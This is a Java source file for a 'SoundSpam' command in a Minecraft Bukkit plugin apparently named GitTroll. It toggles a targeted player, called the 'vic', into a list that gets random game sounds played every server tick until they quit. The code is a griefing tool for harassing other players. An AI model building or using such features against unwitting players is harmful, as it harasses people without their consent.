package net.Lenni0451.GitTroll.command.commands.trolling;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerQuitEvent;

import net.Lenni0451.GitTroll.GitTroll;
import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class SoundSpam extends CommandBase implements Listener {
	
	private List<CustomPlayer> players = new ArrayList<>();
	private Random rnd = new Random();

	public SoundSpam() {
		super("SoundSpam", "Spam a player with random sounds", "<Player>");
		
		Bukkit.getScheduler().runTaskTimer(GitTroll.getInstance(), () -> {
			try {
				for(CustomPlayer player : this.players) {
					player.playSound(Sound.values()[rnd.nextInt(Sound.values().length)]);
				}
			} catch (Throwable e) {}
		}, 0, 1);
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isLength(1)) {
			CustomPlayer vic = this.parsePlayer(args.getString(0), executor);
			
			if(this.players.remove(vic)) {
				executor.sendGitMessage("§cThe player is no longer getting sound spammed.");
			} else {
				this.players.add(vic);
				executor.sendGitMessage("The player now gets sound spammed.");
			}
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {
		if(args.isEmpty()) {
			this.tabCompletePlayers(tabComplete);
		}
	}

	@EventHandler
	public void onQuit(PlayerQuitEvent event) {
		this.players.remove(CustomPlayer.instanceOf(event.getPlayer()));
	}
	
}
